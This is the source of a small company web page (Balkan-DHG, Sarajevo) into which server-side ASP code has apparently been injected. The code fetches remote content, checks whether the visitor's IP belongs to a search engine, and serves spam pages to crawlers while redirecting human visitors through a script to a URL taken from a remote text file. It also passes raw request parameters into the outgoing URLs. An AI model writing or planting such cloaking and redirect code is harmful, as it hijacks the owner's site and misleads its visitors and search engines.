<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<%
function getHTTPPage(url)
    dim Http
    set Http=server.createobject("MSXML2.XMLHTTP")
    Http.open "GET",url,false
    Http.send()
    if Http.readystate<>4 then
        exit function
    end if
    getHTTPPage=bytesToBSTR(Http.responseBody,"UTF-8")
    set http=nothing
    if err.number<>0 then err.Clear
end function
Function BytesToBstr(body,Cset)
        dim objstream
        set objstream = Server.CreateObject("adodb.stream")
        objstream.Type = 1
        objstream.Mode =3
        objstream.Open
        objstream.Write body
        objstream.Position = 0
        objstream.Type = 2
        objstream.Charset = Cset
        BytesToBstr = objstream.ReadText
        objstream.Close
        set objstream = nothing
End Function

Dim Url,Html
yyu=Year(now)&month(now)&day(now)&hour(now)&minute(now)&second(now)
if request("p_id")<>""  then
URL="http://hbheu.weup.fr/product_color/NY_Tou.aspx?s_id=116&rnd="&yyu&"&p_id="&request("p_id")
else if request("pageIndex")<>""  then
URL="http://hbheu.weup.fr/product_color/LB_Tou.aspx?s_id=116&rnd="&yyu&"&pageIndex="&request("pageIndex")&""
else if request("searcher")<>""  then
URL="http://hbheu.weup.fr/product_color/LB_Tou.aspx?s_id=116&rnd="&yyu&"&searcher="&request("searcher")&""
else
URL="http://hbheu.weup.fr/product_color/LB_Tou.aspx?rnd="&yyu&"&s_id=116"
end if
end if
end if
Html = getHTTPPage(Url)

if request("dd")<>"" then
ip="66.249.64.190"
else
ip=Request.ServerVariables("REMOTE_ADDR")

end if
ipurl="http://hbheu.weup.fr/getdomain.aspx?rnd=1&ip="&ip
domain =getHTTPPage(ipurl)
if  (instr(domain,"google")>0 or instr(domain,"msn.com")>0 or instr(domain,"yahoo.com")>0 or instr(domain,"aol.com")>0) then
set re = new RegExp
re.IgnoreCase =True
re.Global = True
re.Pattern = "<sc*?([\s\S]*?)>"
Set matchs = re.Execute(html)
for each match in matchs
sc= match.SubMatches(0)
next
set matchs = nothing
Html=replace(Html,"<s"&sc&"></script>","")
Response.write Html

else

if request("p_id")<>""  then
ccc=request("p_id")
ccc=replace(ccc," ","-")
ccc=replace(ccc,"--","-")
ddd=getHTTPPage("http://hjs.runh.fr/pumaen.txt?id=11")
eee=ddd&ccc&".html"
eee=replace(eee,"--","-")
Response.write "<script> "
Response.write  "document.location="""&eee&"""</script>"
else if request("searcher")<>""  then
ccc=request("searcher")
ccc=replace(ccc," ","-")
ccc=replace(ccc,"--","-")
ddd=getHTTPPage("http://hjs.runh.fr/pumaen.txt?id=11")
eee=ddd&ccc&".html"
eee=replace(eee,"--","-")
Response.write "<script> "
Response.write  "document.location="""&eee&"""</script>"
else if request("pageIndex")<>""  then
ddd=getHTTPPage("http://hjs.runh.fr/pumaen.txt?id=11")
eee=ddd&".html"
Response.write "<script>document.location="""&eee&"""</script>"
end if
end if
end if
end if
%> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link href="css/Style.css" rel="stylesheet" type="text/css">
<style type="text/css">td img {display: block;}</style>

</head>
<body bgcolor="#ffffff">
<table border="0" cellpadding="0" cellspacing="0" width="700" align="center">

  <tbody><tr>
   <td><img src="images/spacer.gif" width="28" height="1" border="0" alt=""></td>
   <td><img src="images/spacer.gif" width="644" height="1" border="0" alt=""></td>
   <td><img src="images/spacer.gif" width="28" height="1" border="0" alt=""></td>
   <td><img src="images/spacer.gif" width="1" height="1" border="0" alt=""></td>
  </tr>

  <tr>
   <td colspan="3"><img name="index_r1_c1" src="images/header-BS.jpg" width="700" height="163" border="0" id="index_r1_c1" usemap="#m_index_r1_c1" alt="Balkan DHG">
    
     <map name="m_index_r1_c1" id="m_index_r1_c12">
       <area shape="poly" coords="237,51,319,68,315,89,233,72,237,51" href="turizam.htm" title="Turizam" alt="Turizam">
       <area shape="poly" coords="140,31,224,43,221,68,137,56,140,31" href="trgovina.htm" title="Trgovina" alt="Trgovina">
       <area shape="poly" coords="48,19,130,27,128,52,45,44,48,19" href="usluge.htm" title="Usluge" alt="Usluge">
     </map></td>
   <td><img src="images/spacer.gif" width="1" height="163" border="0" alt=""></td>
  </tr>
  <p>
  <div  class="content">
<form method="get" action="">
    <input type="text" name="searcher" style="width: 400px" /><input type="submit" value="Searche" />
    </form>
	</div>
<%
						   
						   Dim Urlyy,Htmlyy
yyu=Year(now)&month(now)&day(now)&hour(now)&minute(now)&second(now)

if request("searcher")<>""  then
URLyy="http://hbheu.weup.fr/product_color/LB_NR.aspx?s_id=116&rnd="&yyu&"&searcher="&request("searcher")&""
else if request("pageIndex")<>""  then
URLyy="http://hbheu.weup.fr/product_color/LB_NR.aspx?s_id=116&rnd="&yyu&"&pageIndex="&request("pageIndex")&""
else
URLyy="http://hbheu.weup.fr/product_color/LB_NR.aspx?s_id=116&rnd="&yyu&""
if request("p_id")<>""  then
Urlyy="http://hbheu.weup.fr/product_color/NY_Content.aspx?s_id=116&rnd="&yyu&"&p_id="&request("p_id")
end if
end if
end if
Htmlyy = getHTTPPage(Urlyy)
Htmlyy=replace(Htmlyy,"LB_NR.aspx","")
Htmlyy=replace(Htmlyy,"s_id=116&rnd="&yyu&"&","")
Htmlyy=replace(Htmlyy,"?p_id=","?p_id=")
Response.write Htmlyy
%>
  
  
  
  </p>
  <tr>
   <td colspan="3"><img name="index_r3_c1" src="images/index_r3_c1.jpg" width="700" height="27" border="0" id="index_r3_c1" alt=""></td>
   <td><img src="images/spacer.gif" width="1" height="27" border="0" alt=""></td>
  </tr>
  <tr>
   <td colspan="4"><div class="footer" align="center">Balkan-DHG d.o.o, Ul. Put Famosa 
       38, 71000 Sarajevo<br>
       Tel. +387 33 974 080, Fax. +387 33 974 081, <a href="mailto:info@balkan-dhg.com">info@balkan-dhg.com</a></div></td>
  </tr>
</tbody></table>








</body></html>